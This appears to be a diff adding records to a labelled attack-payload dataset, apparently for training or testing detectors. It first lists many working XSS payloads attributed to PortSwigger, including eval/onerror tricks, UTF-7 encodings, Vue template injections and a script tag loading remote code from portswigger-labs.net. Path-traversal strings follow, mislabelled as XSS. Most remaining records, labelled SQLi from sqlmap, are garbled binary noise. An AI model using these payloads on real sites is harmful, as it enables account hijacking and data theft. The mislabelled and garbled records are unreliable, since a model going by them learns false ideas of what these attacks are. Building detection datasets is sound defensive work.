+{"payload": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+{a:location=name}+\"\")</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+new class b{toString=e=>location=name}+\"\")</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,name</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,'/*'+location</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=\"throw top.onerror=eval,'/*'+URL\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<body onload=\"throw onerror=eval,'/*'+location\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=\"alert\\x281\\x29\">';target.onload=setTimeout(function(){frames[0].postMessage(\"\", \"*\")},100)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\\x28alert\\x281\\x29\\x29';Event.prototype.toString=/x/.toString</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img/src/style=transition:0.1s onerror=\"window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\\x281\\x29'\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img/src/onerror=\"window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\\x281\\x29'\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onerror=eval,new name</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=\"attributes[0].value=name,new onload\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<input onclick=attributes[0].value='`'+URL+'`'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form><input onclick=\"formAction=top.name,type='submit',new submit\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=innerHTML=URL,innerHTML=textContent>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img/src/onerror=innerHTML=URL,innerHTML=textContent>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=innerHTML=URL,eval(textContent)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<meta charset=\"UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "+/v8\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "+/v9\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "+/v+\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "+/v/\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"></iframe>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"></iframe>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form action=\"javascript:alert(1)\"><input type=submit id=x></form><label for=x>XSS</label>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img referrerpolicy=\"no-referrer\" src=\"//portswigger-labs.net\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=# onclick=\"window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe name=\"alert(1)\" src=\"https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></iframe>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<base target=\"alert(1)\"><a href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in base tag</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in a tag</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></map>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x v-html=_c.constructor('alert(1)')()>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x v-if=_c.constructor('alert(1)')()>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_c.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_v.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_s.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<p v-show=\"_c.constructor`alert(1)`()\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x v-on:click='_b.constructor`alert(1)`()'>click</x>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x v-bind:a='_b.constructor`alert(1)`()'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @[_b.constructor`alert(1)`()]>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x :[_b.constructor`alert(1)`()]>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<p v-=_c.constructor`alert(1)`()>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x #[_c.constructor`alert(1)`()]>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<p :=_c.constructor`alert(1)`()>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_b.constructor`alert(1)`()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @click='_b.constructor`alert(1)`()'>click</x>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=alert(1)&gt;\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<xyz<img/src onerror=alert(1)>>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a @['c\\lic\\u{6b}']=\"_c.constructor('alert(1)')()\">test</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{$el.ownerDocument.defaultView.alert(1)}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{$el.innerHTML='\\u003cimg src onerror=alert(1)\\u003e'}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src @error=e=$event.path.pop().alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src @error=e=$event.composedPath().pop().alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src @error=this.alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg@load=this.alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<p slot-scope=\"){}}])+this.constructor.constructor('alert(1)')()})};//\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_openBlock.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_createBlock.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_toDisplayString.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_createVNode.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<p v-show=_createBlock.constructor`alert(1)`()>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @[_openBlock.constructor`alert(1)`()]>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @[_capitalize.constructor`alert(1)`()]>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @click=_withCtx.constructor`alert(1)`()>click</x>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x @click=$event.view.alert(1)>click</x>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{_Vue.h.constructor`alert(1)`()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{$emit.constructor`alert(1)`()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<component is=script text=alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "%20../", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "%2e%2e//google.com", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "%2e%2e;test/", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "%3f/", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "%C0%AE%C0%AE%C0%AF", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "%ff/", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "a%5c.aspx", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "admin%20/", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "examples/jsp/%252e%252e/%252e%252e/manager/html/", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "New%20Folder", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "New%20folder%20(2)", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "phpliteadmin%202.php", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "Read%20Me.txt", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "servlet/%C0%AE%C0%AE%C0%AF", "attack_type": "XSS", "source": "fuzz.txt"}
+{"payload": "OsMFmB{kf%d2Abh\u0013Fp2#rLGi.@癩\u0000v", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "!g A(i\"R&4\u0013e#t\",hT]U\u0019\b\bSI02'M%rњtD4ZX8\"\u0013\u0012tD%Ea\u0019Ȅ@\u001f\u0012S\u0010ip(j\u0007+]TH\t\u001aQC\u0017OHz>4VSHfVHiKl?nZ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "D\u0004\u0004\u001akzY \u001f</\u0015\u000feQ7<?Mgf\u0010\u0015c\b1G\u001b71C\t_\u0003CwOQ%88u\u0010\u0006m\u001aq-\u0015g8&ӜU\"״V-Dht.", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",ǠtQ`\u001aLb\u001b\u0005,%64~w?\u0007NӨ\u0006^~Gm@<M\u0017f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "EGyQZ\u0015%E92\u0015&\"^fB,ݩ\u0003H\u00070ȓ\"-<A+JRb0S\u0014+JR\u0014'IQR\u0014V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%1B\u0019\u0006B\u0010", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "r᪝PXڥ+޹GVIV&[\u0006X%9az5Y5酃ʶ4?=^\u0005/\bۃ.ϺEQ援0a%vPr;]\u000e:\u0015\u0014MNO}z(XX\u0002<'y\\z<z-G", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%A9$6\u00120(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0014%\u0003<\u0014r\u0000(\tE\u0005%A9P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ݖiy-g{#]5MWA6\u0013b\"AD%Df\u0000-:y%q\u00037~yjCADm\u0004-\u0004{\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<1,\u0018U,B\bhFU]\bK-->[\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "FYQR\u0013DP(\u0014\t\u0005BqP\u0018\u0014\u0005\u0005\u00046\u0013\t%[\u0013%CaP\u0014\u0014=)g\u0018(\u0004\u0002`ΗQU;", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "64\u0003SQ[W\\خOd\tK@0--\bR\"\u0005\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "9\u001f$NQ\u00029Ôxs`\u000f`>59Gi\u0015/I%\u0016\u0000s_^|O_7g \u0004\u0003<RL$T6aTu#pƞ(*\u0013EG%280b\u0012>Qxϐ#gC:uF1O8\u00053(\u0003ia \b}.nyZ\"H<sl", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "¹\u0000R\b\u0007Br\u0001CTE%FaF\u0013.`4?FU\u001aL\u0002y\u0015A^\u0011ЉesEyG9GFFyF9&B}E\tTQQQvQfQVOU6I8v", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%X3MrF,\u0010(66z\u000e9xW\u001b_^\u001b^]\u001b][Z\u0019r%b666uM\u0003\"=mqmommK\u0002j;BZV\u001bVU\u001bUT\u001bTS\u001b3M\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "YU$L%<Y1ʢ|ɝMrf'Or'yY\u0010P\t\u0019Y\" \tr \u0006\u0015mc(j?Pa\u0011Elu\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000fhPI\u0002%d9d\u0019j", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "̭l`ɜ_Y%e0cVg\u0000Re G|[u", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ĊyR+ݖ!k)\tŬb\u0013N}(⛗Of\u0001~\u0016ADiD\u0010۪똖\u00064c2ƶ,mh\u00120=UhQ%E1՘\"~jBV", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ":\u0004wW\u001f\u0016\u0013{oO\u0018`D\u0004W-jFdzŒ\u0006\u0007McF\"01F\u0011\u001bcCF=h*\tX\u0013:\u0004M5\u0003uv|#%E9i5tɰ\u000e|n:\u0006n", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "va%f7e\bu\u0000XY\bm\u0017\u001f\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "nO/O1\u0007ktsZ?--_\u000fM@\u0002\u000f&o\u0013\u0019괿:8\u000f?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "p˵A\u001bk\u0015~\u0010\u0017%BaQ(]-JV?\u000e\u0011 1JW\\*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "mXR\u001f~:e\t\u0001\u0013)\u0015S\u0010x͉5NhQ(L\u0014%bD!/`:p\"", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%E8n߷Ҙ\b\u0016t\u0013ᔌ}k}\u0007\u0015|ggawF|<&f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "J@\u001fk&%EA<2^K$%\"pWhU\u001a9HUR \u0006]\u000f:P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016E\u001bMt%f77g", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7>x\u000f\u0002#'Y>I--ld'[>RΖrs`\u0003|c9̈́2/y̋e^", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@1,TJ\u0016Sb*YL%d1,TX^\\{7\u0007m\u000eéu\u0015", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "l\u0017\u001bM03_V\t$\u0002\t\u0012BwX\u0019vOB--IL\u0001E&Ւ ~/\u000e%\u0016%", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "QÛ%d1Dd", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",㌥*S\u0010U LA @2*\u0001:%d4\u0019:\u0007n.%䕬S2j%p\u0001dLo\u001fTvp9>\\i8", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ূS\u0000^bZ]@'\tv\u0017%A37\u0004\u000e\u0014\u0004H\u0016x:'\u001b\u0006\u0006c\u0015\u0003C\t/1\u0001\u0013{\u0005O", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005.g0ФR/.\u0001`\tE2ACiڑ*2\b\u000f%AE`\u0017-Ə\u0012\"-\u0019*f\tnՐ=}Q4\bnlL}lNeV\u0013Bm!Zd\u001f`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}\u0002\u0011`\u00184\u0012CPQ%\u0001%AEP\u00138\u0002b\u0001O _Hڤ\u000eǀ\u00018>_I!GڄjS;\u0006T\u0012\u0015%\t*9\u0006,S\u001b\\9nR=<9S%dCJbSC7?*a6JMC\u00072`H\u0010\u00156v5QL:6.4l7G\u0019%xjz;;)(\u0014\"O1!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ")%d9='UeB\u0013gYeO", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e28\bu\u0016A*\u0014\u0004@v%4A*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "X/^%67\u0012R3,i\t4bF4$\u0003,\tһ2R", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003k\u0011 s%c4|z*ė\u001f=C", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j\u001fHAP)>./R\u0019\u0006w\taWai\u0012|\u0004MSʙ!\u000fY\tdrYى!\u0006X;a͂I<+~~\u00180~H݆QG?ZȊe[闊9\u000e\u0011R--ák=t|z%\u0012n*U-)n$", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "A\u001fw\u0001bbr%95", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "sЈ\tF\\\u0013\u0002<\u0019PQooc%f0Q1ѕ\u0016(gY򫹖᩶,G˚HxN", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&8BLXZ\u0002?5\u001b\u0003\u001a\u0015mߟRN\u000f\u000fÃU񁾖C\u0013\u001f%06Co#raW\u0011\b]SOx\tHhׂ\u0018{][~w`qݱ+Y&@:", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "c(?GvO@mp̚1W\u0006ʱ\u0017*%70FYP\u0005\u0013gt[\u0018dV{f&k&9k\u001a\u0006 4͚", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000Sޏ<ܔ\u0006\u0017!_!=1X#O=<8@\u0007]7\u0017M9@3\u0010/Gխ\u00079\bҹ{êD/OO?\u0003F*zϿ]&B-;\u0007'{\u001f--`=ڼ#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%Q5r'or\u0015*,,r", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017La\u0002m\\ߡ\u0010't\u0015\u001bD|ql\u001b&<$E|\u0018\u0001r|*qF;ܐ5I\u000f/ovF\u0005S\u0013NwOG\u0004鸵~#n\u0005%Q\u00126)--O?/S1^$\t\u0002 2H\u0000Q4l\u0015gc*\u0013Ƣ%]H!5\u0017lL,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0002\u0018fed+#[\u0019VFNO\u0017V`\u0002\u0015Xb\u0014+X1Ŋ)VL\\47\u0000eBP(&\u0014-- uּ0r*p;\u0010Z3]y+>qtzLýN", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "URD%D5d!`H&\u0018\td!`H&\u0018\td!`H&\u0018\td!`H&\u0018\td\u0001ȱ\u0013Sήd%%+)YIJVR\"P+4[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "VHB\u0015Rb\u0014+X!r.s\\,gN\u0012ɋ+L&0\u0004ie̡%9d\u000eqY?8+C\u0014|J]\"BN\u0005E\u000fIDCYC\u0019CBBYB\u0019BAAY!C7\u000f3rrrr\u0015$g9|̠lW+ՕJqwD[s\u0017(IY@\u0019@_TK\u0005ڐ\u0001J^)pf:\u0000\u0016B?\u0001\u0005^dL\u0012f)\t&t!sg3 jg:~g:~g:~g:~g:zg:zgzwޝwgz7Nbe\u0014+'lb\u0015+XqŊ+V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "!VB\u0012l%Ddx|\"D#\u0012.HFϘFhFpF0F>\u0003\u001a=#\u001a=C\u001a9", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00039Sb$j\u0015EJ:\u0013F\u0010 Ai_Ap G\u0011YdӪswg%ff\u0002:", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "qxCZC,h%E0>3ғl5We\u0016Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ";O7yYe\b{\u0010 %79u\u0015n[ʱra", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "h\u0018WHU(%D5z\u0010D\u001f*9S8N\u0015q{\u0014P%", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ":u7\u0010\u0011#|U\u0014ì(uKĨ\u0002@6/\u0002\u0017Tk.q\u0017NI.LYTѥ%+r%41ׇ\u0010", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "9jLfdɌ,%32'C\u00016ۖ]@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0004Lc?,\u0006an3f\u0015kW##vmc \u0018\u0006l(vzck\u0019\u0006h%G+9ZJNVrd%'+9YJNVr\u0001\u0006ɶ-mH\"ft-mH\"fn-mbfi-mbfi-mb*ѭ~Y--3$9\u000eC\"Gê7L+JR*JR*JRD*JR:0]fZr$bʩ2|\u0001֢D*\u0013BeS", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "mR(l-\u0017olxc\u001b[.rvٜ\u0001\t\u0013[b\u0012Ɩ7ļ%-1olycK\u001b[b\u0012Ɩ7ļ%-1\u0001 kc\u001b[jRƖ7Լ-5olycK\u001b[j^\u0001\u0005\u0005\u0005\u001bq\u0014h\u0012\bw#\u0019\u0017犭\u0000\u0018\u001b\u001b\u001b}jbZRq%655z5Z5:5\u001a54", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0018\u001aE\u001a5\u001a%FFv%@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(fʫ\u0019\u0019\u0019\u0019\u0019\u0019\u0019\u0019}\u0019mY_[ F\u0004`!\"%fcei^V`YY\u0016ee%@VXYbey%\u001fVaX\\t׼\\mBJk^ży", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i4@\"k\u0010~[%,r%10.,\u0015\u0001Jncj4Ǩ\u0016![p\u0002bXG$\\1V\u0012\u0014v", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "DNR1\u00103?\u0016\u000e\u000eeBu\u00037d-mMb{5(\u0019Q\u0012ro%Db1}g{\u0006ݤV4&ϛΆ\u00053󀮴qgr\u0005\u0013'&3)O)+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005%0D|!\u0016\t\u0016\bI]ؖ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "gNRlyO%9c\u0010zOcn", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}j@\u0015'z*jX2Z\u0001\bQUtM+\u0016*\u0004cJbq.kU7+f$\u0005-j*\\<b\u0002!\u0017\u0001*Zeep2Xnv\\{W߂\u0016r͉ՊB|v\u0001[\u0001*A\u0001㖊!R9rp)ZH%aCV\u0006|㥾n@s;iC\u00113*</Ξ\u0000\u0002\u0004Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "+\u0010\u000e\u0001|@eL54OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'OR'O\u0013?$u\u0000#O7RR=sgnH醔nH醔nLƔnLĔLL\u0014sL1\u0014sL1O?nSc\u0012A@@H cʟUR3]8o\u0012>+O\u0007JaU\u0002\u0003V\u0003}qn\\7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "HJody%b1+80WWƒD", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "54R\u0017a!eP\u0004TlH4\t%50\u0019`\u0013\u0017E\u00143tadgZ.ba\u0002$\u0014\u0014$8C/ACU/\u0011\b\u0015\u0017THI遑{75\u0017ܚŻ\u00069\u001bϡx:fԐ\u000e5>T\u0010SN", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tA\u0017*5o#Cn.Bz[Ж8 \u0013\u00137jfr&Ẽe@\bu\u0019P '--*`w@y$\u0015Z\u000e\u00134m\u0011\u001a`\u0006\u000fն\u001fۡR\u001fE\t\u0013n", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%1EżMeF`ѕIg~P\u000e00Ƨ?qj&/kdp\\A8p,S\u0012\u0014j\u0016v@G*J\u0005QE;M!Yf", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[--luǓkb\u0004\u000e4N~H", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|\u0016(Vzfa7\u0017[(s{]n\u0000\u0013\u0018\u0011azq\u0007!\u0010k\u0007c\u001b\u0006%b9ܫD\u0018n`y<,~g_-oC΃=ET\u0000L\u0002\u0019K\u0018X<qi<9,K̼'\u0012=ʊR\u0015\u0018dQ", "attack_type": "SQLi", "source": "sqlmap"}
